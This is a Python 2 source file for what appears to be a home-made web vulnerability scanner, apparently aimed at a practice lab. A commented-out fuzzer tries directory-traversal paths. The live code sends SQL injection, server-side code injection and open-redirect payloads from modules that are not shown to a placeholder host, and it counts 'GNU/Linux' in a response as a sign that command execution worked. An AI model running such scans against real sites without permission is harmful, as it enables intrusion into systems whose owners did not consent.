# import re
# import argparse
# import sys
# import requests
# from http.cookies import SimpleCookie

# """
# Done:
# 1.directory traversal for one page

# TODO: 
# 2. Scan all pages
# 3. Load and Store as json file
# """
# endpoint_dict = dict()

# class bcolors:
#     HEADER = '\033[95m'
#     OKBLUE = '\033[94m'
#     OKGREEN = '\033[92m'
#     WARNING = '\033[93m'
#     FAIL = '\033[91m'
#     ENDC = '\033[0m'
#     BOLD = '\033[1m'
#     UNDERLINE = '\033[4m'


# def codecollors(code):
#     if str(code).startswith("2"):
#         colorized = "\033[92m[" + str(code) + "] \033[0m"
#         return colorized
#     elif str(code).startswith("3"):
#         colorized = "\033[93m[" + str(code) + "] \033[0m"
#         return colorized
#     elif str(code).startswith("4"):
#         colorized = "\033[91m[" + str(code) + "] \033[0m"
#         return colorized
#     elif str(code).startswith("5"):
#         colorized = "\033[94m[" + str(code) + "] \033[0m"
#         return colorized
#     else:
#         return code


# class request(object):
#     def query(self, url, cookie=None):
#         if cookie:
#             rawdata = "Cookie: " + cookie
#             cookie = SimpleCookie()
#             cookie.load(rawdata)

#         req = requests.get(url, cookies=cookie, allow_redirects=False)
#         self.raw = req.text
#         self.code = req.status_code

# def load_file():
#     pass

# def write_file():
#     pass

# def forloop():
#     if str(arguments.string) not in str(arguments.url):
#         sys.exit("String: " + bcolors.WARNING + arguments.string + bcolors.ENDC + " not found in url: " + bcolors.FAIL + arguments.url + "\n")

#     count = 0
#     duplicate = []
#     while (count != (arguments.depth + 1)):
#         print("[+] Depth: " + str(count))
#         for var in dotvar:
#             for bvar in befvar:
#                 for word in match.keys():
#                     rewrite = bvar + (var * count) + word
#                     fullrewrite = re.sub(arguments.string,  rewrite, arguments.url)

#                     if fullrewrite not in duplicate:
#                         req = request()
#                         req.query(fullrewrite)
#                         catchdata = re.findall(str(match[word]), req.raw)
#                         if (len(catchdata) != 0):
#                             #print(bcolors.OKGREEN + "\n[" + str(req.code) + "] " + bcolors.ENDC + fullrewrite)
#                             print(codecollors(req.code) + fullrewrite)
#                             print(" Contents Found: " + str(len(catchdata)))
                            
#                         else:
#                             if arguments.verbose:
#                                 print(codecollors(req.code) + fullrewrite)

#                         icount = 0
#                         # Print match
#                         for i in catchdata:
#                             print(" " + bcolors.FAIL + str(i) + bcolors.ENDC)
#                             icount = icount + 1
#                             if (icount > 10):
#                                 print(" [...]")
#                                 break
#                             if arguments.verbose:
#                                 time.sleep(0)
#                     duplicate.append(fullrewrite)
#         count += 1



# if __name__ == '__main__':
#     parser = argparse.ArgumentParser()
#     parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Url to attack.')
#     parser.add_argument('--string', '-s', action='store', dest='string', required=True, help='String in --url to attack. Ex: document.pdf')
#     # parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie.')
#     parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default='6', help='How deep we will go?')
#     parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Show requests')
#     arguments = parser.parse_args()

#     banner = "\n\
#     Starting run in: \033[94m" + arguments.url + "\033[0m\n\
#     \
#     "
#     print(banner)
# forloop()
import requests
import ssci
import oRedirect 
import re
import sqli

BASE_URL = "http://target.com/"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"


def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = ""   
    
    #if get
    if method == "GET":
        getURL = parsedURL + "?" + paramname+"="+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == "POST":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, verbose)
    
    #if function returns:

    if result is not None:
        print payload
        return payload

def checkSuccess(html, attackType, content, v=False):
    if v == True:
        print html

    # if asstackType == shell_command:
    #     match = 

    if attackType == sql_injection:
        match = re.findall(r'<p>.+', html)
        if len(match) ==0 :
            return None
        return match

    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == "https://status.github.com/messages":
            return True

    #server side injection:
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + "index.php")
        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if "GNU/Linux" in html:
            return attackType

    return None;
    

if __name__ == "__main__":
    #sqli
    url = "/sqli/sqli.php"
    payloads = sqli.get_all()
    for payload in payloads:
        injectPayload(url, "username", "POST",payload)



    #Test for server side code injection
    '''
    url = "/serverside/eval2.php"
    payloads = ssci.get_all(url)
    for payload in payloads:
        injectPayload(url, "page", "GET", payload)
    '''
    #test for open redirect
    # url = "/openredirect/openredirect.php"
    # orPayload = oRedirect.get_all()
    # for payload in orPayload:
    #     injectPayload(url, "redirect", "GET", payload)
